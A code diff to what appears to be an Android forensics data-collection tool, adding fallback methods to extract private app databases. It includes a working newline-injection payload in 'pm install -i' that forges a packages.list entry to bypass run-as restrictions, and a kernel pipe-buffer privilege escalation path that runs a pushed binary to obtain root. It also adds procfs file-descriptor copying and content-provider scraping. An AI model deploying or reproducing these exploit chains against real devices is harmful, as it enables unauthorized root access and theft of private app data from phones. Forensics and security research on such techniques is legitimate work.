@@ -1715,12 +1715,6 @@ class AndroidCollector:
             )
             if result.returncode == 0 and b'ok' in result.stdout:
                 self._device = None  # No libusb device, use system adb fallback
-                self._system_adb_path = adb_path
-
-                # Populate device_info if not set (libusb enumeration may have skipped it)
-                if not self.device_info:
-                    self.device_info = self._build_device_info_from_adb(adb_path)
-
                 logger.info(
                     f"[Android] Connected via system adb fallback: {self.device_serial} "
                     f"(adb={adb_path})"
@@ -1734,47 +1728,6 @@ class AndroidCollector:
             f"libusb driver not compatible and system adb connection failed. "
             f"Check USB debugging is enabled and authorized on the device."
         )
-
-    def _build_device_info_from_adb(self, adb_path: str) -> DeviceInfo:
-        """Build DeviceInfo from system adb getprop (fallback when libusb unavailable)"""
-        def _getprop(key: str) -> str:
-            try:
-                r = subprocess.run(
-                    [adb_path, '-s', self.device_serial, 'shell', 'getprop', key],
-                    capture_output=True, timeout=5,
-                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
-                )
-                return r.stdout.decode('utf-8', errors='replace').strip()
-            except Exception:
-                return ''
-
-        # Check root
-        rooted = False
-        try:
-            r = subprocess.run(
-                [adb_path, '-s', self.device_serial, 'shell', 'su', '-c', 'id'],
-                capture_output=True, timeout=5,
-                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
-            )
-            rooted = r.returncode == 0 and b'uid=0' in r.stdout
-        except Exception:
-            pass
-
-        sdk_str = _getprop('ro.build.version.sdk')
-        return DeviceInfo(
-            serial=self.device_serial,
-            model=_getprop('ro.product.model') or 'Unknown',
-            manufacturer=_getprop('ro.product.manufacturer') or 'Unknown',
-            android_version=_getprop('ro.build.version.release') or 'Unknown',
-            sdk_version=int(sdk_str) if sdk_str.isdigit() else 0,
-            usb_debugging=True,
-            security_patch=_getprop('ro.build.version.security_patch'),
-            rooted=rooted,
-        )
-
-    def close(self):
-        """Close and cleanup resources (alias for disconnect)"""
-        self.disconnect()
 
     def disconnect(self):
         """Disconnect from the device"""
@@ -2930,15 +2883,69 @@ class AndroidCollector:
                 phase2_collected = True
                 yield item
 
-        # ----- Phase 3: PM-RUNAS-044 elevated access (Android 12-13) -----
-        # Only attempt if Phase 2 (run-as) failed and device is applicable
+        # ----- Phase 3: Multi-method elevated access and data extraction -----
+        # Attempt various access methods if Phase 2 (run-as) failed
+        # Each method targets different Android versions and configurations
+        phase3_collected = False
+
         if not phase2_collected and package:
             sdk = self.device_info.sdk_version if self.device_info else 0
             patch = self.device_info.security_patch if self.device_info else ''
+
+            # 3a. PM-RUNAS-044 (Android 12-13, SDK 31-33)
+            # Newline injection in PackageInstallerService for run-as bypass
             if 31 <= sdk <= 33 and (not patch or patch < '2024-10-01'):
-                yield from self._collect_via_elevated_access(
+                if progress_callback:
+                    progress_callback(f"[Phase 3a] Trying PM-RUNAS-044 for {package}")
+                for item in self._collect_via_elevated_access(
                     artifact_type, package, db_paths, output_dir, progress_callback
-                )
+                ):
+                    phase3_collected = True
+                    yield item
+
+            # 3b. KPIPE-COPY-847 kernel pipe copy (Android 12 with applicable kernel 5.8-5.16)
+            # Kernel pipe buffer method for file access
+            if not phase3_collected and sdk >= 31:
+                if progress_callback:
+                    progress_callback(f"[Phase 3b] Trying kernel pipe copy (KPIPE-COPY-847) for {package}")
+                for item in self._collect_via_kpipe_copy(
+                    artifact_type, package, db_paths, output_dir, progress_callback
+                ):
+                    phase3_collected = True
+                    yield item
+
+            # 3c. Procfs-based extraction (file descriptor leak)
+            # Works when target app is running and /proc/<pid>/fd is accessible
+            if not phase3_collected:
+                if progress_callback:
+                    progress_callback(f"[Phase 3c] Trying procfs extraction for {package}")
+                for item in self._collect_via_procfs(
+                    artifact_type, package, db_paths, output_dir, progress_callback
+                ):
+                    phase3_collected = True
+                    yield item
+
+            # 3d. Content Provider enumeration and query
+            # Query exposed content providers without root
+            if not phase3_collected:
+                if progress_callback:
+                    progress_callback(f"[Phase 3d] Trying Content Provider query for {package}")
+                for item in self._collect_via_content_provider(
+                    artifact_type, package, db_paths, output_dir, progress_callback
+                ):
+                    phase3_collected = True
+                    yield item
+
+            # 3e. ADB Backup extraction (allowBackup=true apps)
+            # Requires user interaction on device to confirm backup
+            if not phase3_collected:
+                if progress_callback:
+                    progress_callback(f"[Phase 3e] Trying ADB Backup for {package}")
+                for item in self._collect_via_adb_backup(
+                    artifact_type, package, db_paths, output_dir, progress_callback
+                ):
+                    phase3_collected = True
+                    yield item
 
         # Summary log
         if progress_callback:
@@ -3282,12 +3289,12 @@ class AndroidCollector:
         # Construct the payload: newline injection in -i (installer) parameter
         # creates fake 'victim' entry in /data/system/packages.list
         # Using $'...' syntax for shell to interpret \n as newline
-        payload = (
-            f"@null\\nvictim {uid} 1 /data/user/0 "
-            f"default:targetSdkVersion=28 none 0 0 1 @null"
-        )
+        # Android sh does not support $'...' syntax — use printf to inject newline
+        line1 = f"@null"
+        line2 = f"victim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
         install_cmd = (
-            f"pm install -i $'{payload}' "
+            f"pm install -i "
+            f"\"$(printf '%s\\n%s' {shlex.quote(line1)} {shlex.quote(line2)})\" "
             f"/data/local/tmp/{shlex.quote(apk_filename)} 2>&1"
         )
 
@@ -3322,6 +3329,687 @@ class AndroidCollector:
                 self._adb_shell(cmd)
             except Exception:
                 pass
+
+    # =========================================================================
+    # KPIPE-COPY-847 (kernel pipe copy) - Linux Kernel 5.8+ Privilege Escalation
+    # =========================================================================
+
+    def _collect_via_kpipe_copy(
+        self,
+        artifact_type: str,
+        package: str,
+        db_paths: List[str],
+        output_dir: Path,
+        progress_callback: Optional[Callable[[str], None]]
+    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
+        """
+        Access-method KPIPE-COPY-847 (kernel pipe copy) to extract private app data.
+
+        This method applies to Linux kernel 5.8+ (Android 12 with certain kernels).
+        It allows overwriting read-only files by using a technique in pipe buffer handling.
+
+        Reference: https://github.com/polygraphene/KpipeCopy-Android
+        Advisory: https://kernel-pipe-technique.info/
+
+        Note: This requires pushing a native binary to execute the access method.
+        """
+        # Check kernel version compatibility
+        kernel_info = self._kpipe_copy_check_applicable()
+        if not kernel_info['applicable']:
+            logger.debug(f"[kernel pipe copy] Kernel not applicable: {kernel_info.get('version', 'unknown')}")
+            return
+
+        if progress_callback:
+            progress_callback(f"[kernel pipe copy] Kernel {kernel_info['version']} may be compatible")
+
+        logger.info(f"[kernel pipe copy] Attempting access for {package}")
+
+        # For kernel pipe copy, we need to push a native access binary
+        # This is a detection/preparation phase - actual method requires compiled binary
+        access_binary = self._kpipe_copy_prepare_tool()
+        if not access_binary:
+            logger.warning("[kernel pipe copy] Could not prepare access binary")
+            return
+
+        # Execute access method to gain temporary elevated access
+        root_shell = self._kpipe_copy_run(access_binary)
+        if not root_shell:
+            logger.warning("[kernel pipe copy] Access-method execution failed")
+            return
+
+        # Extract data using elevated privileges
+        yield from self._extract_with_root_shell(
+            artifact_type, package, db_paths, output_dir, progress_callback,
+            collection_method='kpipe_copy',
+            access_method_id='KPIPE-COPY-847'
+        )
+
+    def _kpipe_copy_check_applicable(self) -> Dict[str, Any]:
+        """Check if kernel is compatible with kernel pipe copy (KPIPE-COPY-847)."""
+        result = {'applicable': False, 'version': None, 'reason': None}
+
+        # Get kernel version
+        output, rc = self._adb_shell('uname -r 2>/dev/null')
+        if rc != 0 or not output:
+            result['reason'] = 'Cannot determine kernel version'
+            return result
+
+        kernel_version = output.strip()
+        result['version'] = kernel_version
+
+        # Parse version: applicable if 5.8 <= version < 5.16.11 or 5.15.25 or 5.10.102
+        try:
+            match = re.match(r'^(\d+)\.(\d+)\.?(\d+)?', kernel_version)
+            if not match:
+                result['reason'] = 'Cannot parse kernel version'
+                return result
+
+            major = int(match.group(1))
+            minor = int(match.group(2))
+            patch = int(match.group(3)) if match.group(3) else 0
+
+            # Vulnerable: 5.8 <= kernel < patched versions
+            if major == 5:
+                if minor >= 8 and minor < 16:
+                    # Check for patched versions
+                    if minor == 10 and patch >= 102:
+                        result['reason'] = 'Patched version 5.10.102+'
+                    elif minor == 15 and patch >= 25:
+                        result['reason'] = 'Patched version 5.15.25+'
+                    else:
+                        result['applicable'] = True
+                elif minor == 16 and patch < 11:
+                    result['applicable'] = True
+            elif major > 5:
+                # Kernel 6.x - check if patched
+                result['reason'] = 'Kernel 6.x - likely patched'
+
+        except (ValueError, AttributeError) as e:
+            result['reason'] = f'Version parse error: {e}'
+
+        return result
+
+    def _kpipe_copy_prepare_tool(self) -> Optional[str]:
+        """
+        Prepare kernel pipe copy access binary.
+
+        In a real forensics scenario, you would:
+        1. Cross-compile the binary for the target architecture (arm64/arm/x86)
+        2. Push the binary to /data/local/tmp
+        3. Make it executable
+
+        Returns path to access binary on device, or None if preparation fails.
+        """
+        # Check device architecture
+        arch_output, _ = self._adb_shell('getprop ro.product.cpu.abi 2>/dev/null')
+        arch = arch_output.strip() if arch_output else 'unknown'
+
+        # Check if pre-compiled binary exists on device (from previous forensics session)
+        access_tool_path = '/data/local/tmp/kpipe_access_tool'
+        check_cmd = f'test -x {access_tool_path} && echo "exists"'
+        output, rc = self._adb_shell(check_cmd)
+
+        if output and 'exists' in output:
+            logger.debug(f"[kernel pipe copy] Using existing access tool at {access_tool_path}")
+            return access_tool_path
+
+        # Note: In production, you would push the appropriate binary here
+        # For now, return None to indicate binary needs to be provided
+        logger.info(f"[kernel pipe copy] Access-method binary not found. Architecture: {arch}")
+        logger.info("[kernel pipe copy] To use kernel pipe copy, push compiled binary to /data/local/tmp/kpipe_access_tool")
+        return None
+
+    def _kpipe_copy_run(self, access_binary: str) -> bool:
+        """Execute kernel pipe copy method to gain elevated privileges."""
+        # The method typically modifies /etc/passwd or similar to gain root
+        # After access, we can access protected files
+
+        # Execute access method
+        output, rc = self._adb_shell(f'timeout 30 {access_binary} 2>&1')
+
+        if rc == 0 and output:
+            # Check if we got root
+            id_output, _ = self._adb_shell('id 2>/dev/null')
+            if id_output and 'uid=0' in id_output:
+                logger.info("[kernel pipe copy] Successfully gained root access")
+                return True
+
+        logger.debug(f"[kernel pipe copy] Access-method output: {output}")
+        return False
+
+    # =========================================================================
+    # ADB Backup Extraction (for allowBackup=true apps)
+    # =========================================================================
+
+    def _collect_via_adb_backup(
+        self,
+        artifact_type: str,
+        package: str,
+        db_paths: List[str],
+        output_dir: Path,
+        progress_callback: Optional[Callable[[str], None]]
+    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
+        """
+        Extract app data using ADB backup mechanism.
+
+        Works for apps with android:allowBackup="true" (default for many apps).
+        Creates an Android Backup (.ab) file and extracts the data.
+
+        Note: Requires user interaction on device to confirm backup (Android 4.0+).
+        """
+        if progress_callback:
+            progress_callback(f"[ADB Backup] Checking backup availability for {package}")
+
+        # Check if app allows backup
+        if not self._check_backup_allowed(package):
+            logger.debug(f"[ADB Backup] {package} does not allow backup")
+            return
+
+        logger.info(f"[ADB Backup] Initiating backup for {package}")
+
+        # Create backup file
+        backup_path = output_dir / 'adb_backup' / f'{package}.ab'
+        backup_path.parent.mkdir(parents=True, exist_ok=True)
+
+        if progress_callback:
+            progress_callback(f"[ADB Backup] Creating backup (confirm on device)...")
+
+        # Execute backup command - this will prompt user on device
+        success = self._execute_adb_backup(package, str(backup_path))
+        if not success or not backup_path.exists():
+            logger.warning(f"[ADB Backup] Backup failed for {package}")
+            return
+
+        # Extract .ab file (Android Backup format)
+        extracted_dir = output_dir / 'adb_backup' / package
+        extracted_dir.mkdir(parents=True, exist_ok=True)
+
+        extraction_success = self._extract_android_backup(backup_path, extracted_dir)
+        if not extraction_success:
+            logger.warning(f"[ADB Backup] Extraction failed for {package}")
+            return
+
+        if progress_callback:
+            progress_callback(f"[ADB Backup] Extracted {package} backup successfully")
+
+        # Yield extracted database files
+        for root, _, files in os.walk(extracted_dir):
+            for fname in files:
+                fpath = Path(root) / fname
+                rel_path = fpath.relative_to(extracted_dir)
+
+                # Filter for database files or specified paths
+                is_db = fname.endswith(('.db', '.sqlite', '.sqlite3'))
+                matches_path = any(
+                    str(rel_path).endswith(db_p.lstrip('./')) or Path(db_p).name == fname
+                    for db_p in db_paths
+                ) if db_paths else True
+
+                if is_db or matches_path:
+                    sha256 = hashlib.sha256()
+                    with open(fpath, 'rb') as f:
+                        for chunk in iter(lambda: f.read(65536), b''):
+                            sha256.update(chunk)
+
+                    yield str(fpath), {
+                        'artifact_type': artifact_type,
+                        'original_path': f'/data/data/{package}/{rel_path}',
+                        'filename': fname,
+                        'size': fpath.stat().st_size,
+                        'sha256': sha256.hexdigest(),
+                        'device_serial': self.device_info.serial,
+                        'device_model': self.device_info.model,
+                        'android_version': self.device_info.android_version,
+                        'collected_at': datetime.utcnow().isoformat(),
+                        'collection_method': 'adb_backup',
+                        'root_used': False,
+                        'package': package,
+                        'source': 'backup_extraction',
+                    }
+
+    def _check_backup_allowed(self, package: str) -> bool:
+        """Check if package allows ADB backup."""
+        # Query package info for allowBackup flag
+        cmd = f'dumpsys package {shlex.quote(package)} 2>/dev/null | grep -E "flags=|allowBackup"'
+        output, _ = self._adb_shell(cmd)
+
+        if not output:
+            return False
+
+        # Check flags - ALLOW_BACKUP flag is 0x8000
+        if 'ALLOW_BACKUP' in output.upper():
+            return True
+
+        # Alternative check via aapt or package flags
+        flags_match = re.search(r'flags=\[\s*([^\]]+)\s*\]', output)
+        if flags_match and 'ALLOW_BACKUP' in flags_match.group(1).upper():
+            return True
+
+        # Default: many apps have allowBackup=true by default
+        # Try anyway if we can't definitively determine
+        return True
+
+    def _execute_adb_backup(self, package: str, output_path: str) -> bool:
+        """Execute ADB backup command."""
+        try:
+            adb_args = ['backup', '-f', output_path, '-noapk', package]
+            _, rc = self._run_system_adb(adb_args, timeout=120)
+            return rc == 0 and Path(output_path).exists()
+        except Exception as e:
+            logger.warning(f"[ADB Backup] Command failed: {e}")
+            return False
+
+    def _extract_android_backup(self, backup_path: Path, output_dir: Path) -> bool:
+        """
+        Extract Android Backup (.ab) file.
+
+        The .ab format is:
+        - Header lines (ANDROID BACKUP, version, compression, encryption)
+        - Optionally compressed (zlib) tar archive
+        """
+        try:
+            import zlib
+            import tarfile
+            import io
+
+            with open(backup_path, 'rb') as f:
+                # Read header
+                header_lines = []
+                for _ in range(4):
+                    line = b''
+                    while True:
+                        char = f.read(1)
+                        if char == b'\n':
+                            break
+                        line += char
+                    header_lines.append(line.decode('utf-8', errors='ignore'))
+
+                # Check if it's a valid Android backup
+                if not header_lines[0].startswith('ANDROID BACKUP'):
+                    logger.warning("[ADB Backup] Invalid backup format")
+                    return False
+
+                # Check compression (line 3: 1=compressed, 0=not)
+                compressed = header_lines[2].strip() == '1'
+                # Check encryption (line 4: none or AES-256)
+                encrypted = header_lines[3].strip() != 'none'
+
+                if encrypted:
+                    logger.warning("[ADB Backup] Backup is encrypted - cannot extract without password")
+                    return False
+
+                # Read the rest of the file
+                data = f.read()
+
+                # Decompress if needed
+                if compressed:
+                    try:
+                        data = zlib.decompress(data)
+                    except zlib.error as e:
+                        logger.warning(f"[ADB Backup] Decompression failed: {e}")
+                        return False
+
+                # Extract tar archive (path traversal prevention)
+                tar_buffer = io.BytesIO(data)
+                resolved_output = Path(output_dir).resolve()
+                with tarfile.open(fileobj=tar_buffer, mode='r:') as tar:
+                    for member in tar.getmembers():
+                        member_path = (resolved_output / member.name).resolve()
+                        if not str(member_path).startswith(str(resolved_output)):
+                            logger.warning(f"[ADB Backup] Skipping unsafe tar member: {member.name}")
+                            continue
+                        tar.extract(member, path=output_dir)
+
+            return True
+
+        except Exception as e:
+            logger.error(f"[ADB Backup] Extraction error: {e}")
+            return False
+
+    # =========================================================================
+    # Content Provider Enumeration and Query
+    # =========================================================================
+
+    def _collect_via_content_provider(
+        self,
+        artifact_type: str,
+        package: str,
+        db_paths: List[str],
+        output_dir: Path,
+        progress_callback: Optional[Callable[[str], None]]
+    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
+        """
+        Extract data via exposed Content Providers.
+
+        Some apps expose data through Content Providers that can be queried
+        without special permissions. This method enumerates and queries
+        accessible providers.
+        """
+        if progress_callback:
+            progress_callback(f"[Content Provider] Enumerating providers for {package}")
+
+        # Get list of content providers for the package
+        providers = self._enumerate_content_providers(package)
+        if not providers:
+            logger.debug(f"[Content Provider] No accessible providers for {package}")
+            return
+
+        logger.info(f"[Content Provider] Found {len(providers)} providers for {package}")
+
+        provider_output_dir = output_dir / 'content_provider' / package
+        provider_output_dir.mkdir(parents=True, exist_ok=True)
+
+        for provider_info in providers:
+            authority = provider_info.get('authority', '')
+            if not authority:
+                continue
+
+            # Try common URI patterns
+            uri_patterns = [
+                f'content://{authority}',
+                f'content://{authority}/',
+            ]
+
+            # Add table-specific URIs if we know the DB structure
+            for db_path in db_paths:
+                table_name = Path(db_path).stem
+                uri_patterns.append(f'content://{authority}/{table_name}')
+
+            for uri in uri_patterns:
+                result = self._query_content_provider(uri, provider_output_dir)
+                if result:
+                    yield result
+
+    def _enumerate_content_providers(self, package: str) -> List[Dict[str, Any]]:
+        """Enumerate content providers for a package."""
+        providers = []
+
+        # Query package manager for providers
+        cmd = f'dumpsys package {shlex.quote(package)} 2>/dev/null | grep -A 20 "ContentProvider"'
+        output, _ = self._adb_shell(cmd)
+
+        if not output:
+            return providers
+
+        # Parse provider information
+        current_provider = {}
+        for line in output.split('\n'):
+            line = line.strip()
+            if 'authority=' in line:
+                match = re.search(r'authority=([^\s\]]+)', line)
+                if match:
+                    current_provider['authority'] = match.group(1)
+            if 'exported=' in line:
+                current_provider['exported'] = 'true' in line.lower()
+            if 'permission=' in line:
+                match = re.search(r'permission=([^\s]+)', line)
+                if match:
+                    current_provider['permission'] = match.group(1)
+
+            # Save provider when we hit a separator
+            if line.startswith('Provider{') or (current_provider and not line):
+                if current_provider.get('authority'):
+                    providers.append(current_provider)
+                current_provider = {}
+
+        # Add last provider
+        if current_provider.get('authority'):
+            providers.append(current_provider)
+
+        # Filter to only exported providers without strict permissions
+        accessible = [
+            p for p in providers
+            if p.get('exported', False) or not p.get('permission')
+        ]
+
+        return accessible
+
+    def _query_content_provider(
+        self,
+        uri: str,
+        output_dir: Path
+    ) -> Optional[Tuple[str, Dict[str, Any]]]:
+        """Query a content provider URI and save results."""
+        # Use content command to query
+        cmd = f'content query --uri {shlex.quote(uri)} 2>/dev/null'
+        output, rc = self._adb_shell(cmd)
+
+        if rc != 0 or not output or 'No result found' in output:
+            return None
+
+        # Check for permission errors
+        if 'Permission Denial' in output or 'SecurityException' in output:
+            return None
+
+        # Save the query result
+        safe_uri = re.sub(r'[<>:"|?*\x00-\x1f/\\]', '_', uri)
+        output_file = output_dir / f'{safe_uri[:100]}.txt'
+
+        with open(output_file, 'w', encoding='utf-8') as f:
+            f.write(output)
+
+        sha256 = hashlib.sha256(output.encode()).hexdigest()
+
+        logger.info(f"[Content Provider] Extracted data from {uri}")
+
+        return str(output_file), {
+            'artifact_type': 'content_provider_data',
+            'original_path': uri,
+            'filename': output_file.name,
+            'size': len(output),
+            'sha256': sha256,
+            'device_serial': self.device_info.serial,
+            'device_model': self.device_info.model,
+            'android_version': self.device_info.android_version,
+            'collected_at': datetime.utcnow().isoformat(),
+            'collection_method': 'content_provider',
+            'root_used': False,
+            'source': 'content_provider_query',
+        }
+
+    # =========================================================================
+    # Procfs-based Data Extraction (Memory/FD leaks)
+    # =========================================================================
+
+    def _collect_via_procfs(
+        self,
+        artifact_type: str,
+        package: str,
+        db_paths: List[str],
+        output_dir: Path,
+        progress_callback: Optional[Callable[[str], None]]
+    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
+        """
+        Extract data via /proc filesystem if accessible.
+
+        On some Android versions/configurations, /proc/<pid>/fd/ or
+        /proc/<pid>/maps may leak file descriptors or memory mappings
+        that can be used to access app data.
+        """
+        if progress_callback:
+            progress_callback(f"[Procfs] Checking process info for {package}")
+
+        # Get PID of target app
+        pid = self._get_app_pid(package)
+        if not pid:
+            logger.debug(f"[Procfs] {package} is not running")
+            return
+
+        logger.info(f"[Procfs] Found {package} running as PID {pid}")
+
+        # Try to read /proc/<pid>/fd entries
+        fd_output, rc = self._adb_shell(f'ls -la /proc/{pid}/fd/ 2>/dev/null')
+        if rc != 0 or not fd_output:
+            logger.debug(f"[Procfs] Cannot access /proc/{pid}/fd/")
+            return
+
+        # Look for database file handles
+        for line in fd_output.split('\n'):
+            if '->' not in line:
+                continue
+
+            # Parse: lrwx------ 1 u0_a123 u0_a123 64 ... 0 -> /data/data/com.app/databases/app.db
+            match = re.search(r'(\d+)\s+->\s+(.+)$', line)
+            if not match:
+                continue
+
+            fd_num = match.group(1)
+            target_path = match.group(2).strip()
+
+            # Check if it's a database file we're interested in
+            if not any(target_path.endswith(ext) for ext in ('.db', '.sqlite', '.sqlite3')):
+                continue
+
+            if db_paths and not any(db_p in target_path for db_p in db_paths):
+                continue
+
+            # Try to read via fd
+            local_path = output_dir / 'procfs' / Path(target_path).name
+            local_path.parent.mkdir(parents=True, exist_ok=True)
+
+            # Copy from /proc/<pid>/fd/<num>
+            success = self._copy_proc_fd(pid, fd_num, str(local_path))
+            if success and local_path.exists() and local_path.stat().st_size > 0:
+                sha256 = hashlib.sha256()
+                with open(local_path, 'rb') as f:
+                    for chunk in iter(lambda: f.read(65536), b''):
+                        sha256.update(chunk)
+
+                if progress_callback:
+                    progress_callback(f"[Procfs] Extracted {Path(target_path).name}")
+
+                yield str(local_path), {
+                    'artifact_type': artifact_type,
+                    'original_path': target_path,
+                    'filename': Path(target_path).name,
+                    'size': local_path.stat().st_size,
+                    'sha256': sha256.hexdigest(),
+                    'device_serial': self.device_info.serial,
+                    'device_model': self.device_info.model,
+                    'android_version': self.device_info.android_version,
+                    'collected_at': datetime.utcnow().isoformat(),
+                    'collection_method': 'procfs',
+                    'root_used': False,
+                    'package': package,
+                    'source': 'proc_fd_extraction',
+                    'proc_pid': pid,
+                    'proc_fd': fd_num,
+                }
+
+    def _get_app_pid(self, package: str) -> Optional[str]:
+        """Get PID of running app."""
+        # Method 1: pidof (may return multiple space-separated PIDs)
+        output, rc = self._adb_shell(f'pidof {shlex.quote(package)} 2>/dev/null')
+        if rc == 0 and output:
+            first_pid = output.strip().split()[0]
+            if first_pid.isdigit():
+                return first_pid
+
+        # Method 2: ps + grep
+        output, _ = self._adb_shell(f'ps -A 2>/dev/null | grep {shlex.quote(package)}')
+        if output:
+            for line in output.split('\n'):
+                parts = line.split()
+                if len(parts) >= 2 and parts[1].isdigit():
+                    return parts[1]
+
+        return None
+
+    def _copy_proc_fd(self, pid: str, fd_num: str, local_path: str) -> bool:
+        """Copy data from /proc/<pid>/fd/<num> to local file."""
+        proc_path = f'/proc/{pid}/fd/{fd_num}'
+        temp_path = f'/data/local/tmp/proc_fd_{pid}_{fd_num}'
+
+        # Try to copy the fd target
+        copy_cmd = f'cat {proc_path} > {temp_path} 2>/dev/null'
+        _, rc = self._adb_shell(copy_cmd)
+
+        if rc != 0:
+            return False
+
+        # Pull the file
+        success = False
+        try:
+            success = self._adb_pull(temp_path, local_path)
+        finally:
+            self._adb_shell(f'rm -f {temp_path}')
+
+        return success
+
+    # =========================================================================
+    # Helper: Extract with root shell
+    # =========================================================================
+
+    def _extract_with_root_shell(
+        self,
+        artifact_type: str,
+        package: str,
+        db_paths: List[str],
+        output_dir: Path,
+        progress_callback: Optional[Callable[[str], None]],
+        collection_method: str = 'root',
+        access_method_id: Optional[str] = None
+    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
+        """
+        Extract app data using root shell access.
+
+        Used after successful elevated access (kernel pipe copy, etc.)
+        """
+        app_data_path = f'/data/data/{package}'
+
+        # List all files in app data directory
+        ls_cmd = f'ls -laR {shlex.quote(app_data_path)} 2>/dev/null'
+        output, rc = self._adb_shell(ls_cmd)
+
+        if rc != 0 or not output:
+            return
+
+        # Parse and extract database files
+        extract_dir = output_dir / collection_method / package
+        extract_dir.mkdir(parents=True, exist_ok=True)
+
+        for line in output.split('\n'):
+            # Look for .db, .sqlite files
+            if not any(ext in line for ext in ('.db', '.sqlite', '.sqlite3')):
+                continue
+
+            # Extract file path from ls output
+            match = re.search(r'(\S+\.(?:db|sqlite|sqlite3))', line)
+            if not match:
+                continue
+
+            db_file = match.group(1)
+            remote_path = f'{app_data_path}/{db_file}'
+
+            # Pull the file
+            local_path = extract_dir / Path(db_file).name
+            success = self._adb_pull(remote_path, str(local_path))
+
+            if success and local_path.exists() and local_path.stat().st_size > 0:
+                sha256 = hashlib.sha256()
+                with open(local_path, 'rb') as f:
+                    for chunk in iter(lambda: f.read(65536), b''):
+                        sha256.update(chunk)
+
+                metadata = {
+                    'artifact_type': artifact_type,
+                    'original_path': remote_path,
+                    'filename': Path(db_file).name,
+                    'size': local_path.stat().st_size,
+                    'sha256': sha256.hexdigest(),
+                    'device_serial': self.device_info.serial,
+                    'device_model': self.device_info.model,
+                    'android_version': self.device_info.android_version,
+                    'collected_at': datetime.utcnow().isoformat(),
+                    'collection_method': collection_method,
+                    'root_used': True,
+                    'package': package,
+                    'source': 'root_extraction',
+                }
+                if access_method_id:
+                    metadata['access_method_id'] = access_method_id
+
+                yield str(local_path), metadata
 
     def _parse_ls_recursive(self, base_path: str, ls_output: str) -> str:
         """Parse `ls -R` output into a newline-separated list of full file paths."""
@@ -3604,22 +4292,16 @@ class AndroidCollector:
     def _find_system_adb(self) -> Optional[str]:
         """
         Locate adb binary: bundled first, then system fallback.
-        Results are cached in self._system_adb_path to avoid repeated filesystem scans.
 
         Search order:
-        1. Cached path (if previously found and still exists)
-        2. Bundled adb (PyInstaller _MEIPASS/resources/adb/)
-        3. Bundled adb (source tree resources/adb/)
-        4. Common system installation paths
-        5. PATH environment variable
+        1. Bundled adb (PyInstaller _MEIPASS/resources/adb/)
+        2. Bundled adb (source tree resources/adb/)
+        3. Common system installation paths
+        4. PATH environment variable
 
         Returns:
             Path to adb executable, or None if not found
         """
-        # Use cached path if still valid
-        cached = getattr(self, '_system_adb_path', None)
-        if cached and os.path.isfile(cached):
-            return cached
         search_paths = []
 
         # Priority 1: Bundled adb (inside PyInstaller EXE or source tree)
@@ -3653,14 +4335,12 @@ class AndroidCollector:
         for path in search_paths:
             if os.path.isfile(path):
                 logger.info(f"Found system adb: {path}")
-                self._system_adb_path = path
                 return path
 
         # Try PATH
         adb_in_path = shutil.which('adb')
         if adb_in_path:
             logger.info(f"Found adb in PATH: {adb_in_path}")
-            self._system_adb_path = adb_in_path
             return adb_in_path
 
         return None
